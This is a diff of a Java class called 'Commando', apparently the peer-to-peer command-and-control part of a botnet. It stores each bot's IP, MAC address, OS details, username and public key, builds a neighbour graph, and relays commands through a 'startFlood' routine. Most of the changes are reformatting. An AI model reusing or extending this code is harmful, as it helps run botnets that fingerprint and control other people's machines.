@@ -59,9 +59,10 @@ public class Commando {
 
 	@Autowired
 	private CryptoPKI pki;
-	
+
 	@Autowired
 	private CryptoUtils crypto;
+
 	/**
 	 * 
 	 */
@@ -76,17 +77,11 @@ public class Commando {
 		nServ.updateDnsInformation();
 		graph = createNetworkP2P();
 		System.out.println("blab " + graph);
-		
-		Bot bot = new Bot(nServ.getIdHash(), 
-					nServ.getMyIp().toString(), 
-					nServ.getMac(),
-					nServ.getOs(), 
-					nServ.getVersionOS(), 
-					nServ.getArchOS(), 
-					nServ.getUsernameOS(),
-					pki.getPubRSAKey(),
-					(nServ.isElegible()+""));
-			bServ.save(bot);
+
+		Bot bot = new Bot(nServ.getIdHash(), nServ.getMyIp().toString(), nServ.getMac(), nServ.getOs(),
+				nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(), pki.getPubRSAKey(),
+				(nServ.isElegible() + ""));
+		bServ.save(bot);
 	}
 
 	/**
@@ -105,7 +100,7 @@ public class Commando {
 		// creo grafo partenza
 		graph = new ListenableUndirectedGraph<IP, DefaultEdge>(DefaultEdge.class);
 		List<Bot> bots = bServ.findAll();
-		
+
 		ArrayList<IP> nodes = new ArrayList<IP>();
 		bots.forEach(bot -> nodes.add(new IP(bot.getIp())));
 
@@ -179,7 +174,8 @@ public class Commando {
 				try {
 					bot = new Bot(objects.get(0).toString(), objects.get(1).toString(), objects.get(2).toString(),
 							objects.get(3).toString(), objects.get(4).toString(), objects.get(5).toString(),
-							objects.get(6).toString(), pki.rebuildPuK(objects.get(8).toString()),objects.get(9).toString());
+							objects.get(6).toString(), pki.rebuildPuK(objects.get(8).toString()),
+							objects.get(9).toString());
 					bServ.save(bot);
 				} catch (NoSuchAlgorithmException | InvalidKeySpecException e) {
 					System.out.println("Non sono riuscito a salvare il bot causa ricostruzione chiave");
@@ -192,15 +188,17 @@ public class Commando {
 	/**
 	 * @param data
 	 * @return
-	 * @throws BadPaddingException 
-	 * @throws IllegalBlockSizeException 
-	 * @throws InvalidAlgorithmParameterException 
-	 * @throws UnsupportedEncodingException 
-	 * @throws NoSuchPaddingException 
-	 * @throws NoSuchAlgorithmException 
-	 * @throws InvalidKeyException 
+	 * @throws BadPaddingException
+	 * @throws IllegalBlockSizeException
+	 * @throws InvalidAlgorithmParameterException
+	 * @throws UnsupportedEncodingException
+	 * @throws NoSuchPaddingException
+	 * @throws NoSuchAlgorithmException
+	 * @throws InvalidKeyException
 	 */
-	public ArrayList<String> getNeighbours(String data) throws InvalidKeyException, NoSuchAlgorithmException, NoSuchPaddingException, UnsupportedEncodingException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException {
+	public ArrayList<String> getNeighbours(String data)
+			throws InvalidKeyException, NoSuchAlgorithmException, NoSuchPaddingException, UnsupportedEncodingException,
+			InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException {
 		String idBot;
 		Bot bot = null;
 		try {
@@ -211,14 +209,13 @@ public class Commando {
 			System.out.println("failed to decrypt data");
 			return null;
 		}
-		System.out.println("id bot "+idBot);
+		System.out.println("id bot " + idBot);
 		bot = bServ.searchBotId(idBot);
-		
-		
+
 		if (bot == null) {
 			return null;// non autenticato
 		} else {
-			System.out.println(" bot "+ bot.getIp());
+			System.out.println(" bot " + bot.getIp());
 			if (graph.containsVertex(new IP(bot.getIp()))) {
 				Set<DefaultEdge> neighbours = graph.edgesOf(new IP(bot.getIp()));
 				if (neighbours.size() < calculateK(bServ.findAll().size())) {
@@ -238,16 +235,20 @@ public class Commando {
 
 			IP s = graph.getEdgeSource(a[i]);
 			IP t = graph.getEdgeTarget(a[i]);
-
-			if (!s.equals(new IP(bot.getIp()))) {
-				Bot sB = bServ.searchBotIP(s);
-				ipN.add(new Pairs<IP, PublicKey>(new IP(sB.getIp()), sB.getPubKey()));
+			try {
+				if (!s.equals(new IP(bot.getIp()))) {
+					Bot sB = bServ.searchBotIP(s);
+					ipN.add(new Pairs<String, String>(sB.getIp(), pki.demolishPuK(sB.getPubKey())));
+				}
+				if (!t.equals(new IP(bot.getIp()))) {
+					Bot tB = bServ.searchBotIP(t);
+					ipN.add(new Pairs<String, String>(tB.getIp(), pki.demolishPuK(tB.getPubKey())));
+				}
+			} catch (InvalidKeySpecException e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
 			}
-			if (!t.equals(new IP(bot.getIp()))) {
-				Bot tB = bServ.searchBotIP(t);
-				ipN.add(new Pairs<IP, PublicKey>(new IP(tB.getIp()), tB.getPubKey()));
-			}
-		}		
+		}
 
 		return pki.getCrypto().encodeObjs(ipN);
 	}
@@ -287,7 +288,8 @@ public class Commando {
 			}
 
 			startFlood(msg);
-		} return;
+		}
+		return;
 	}
 
 	public void startFlood(String msg) {
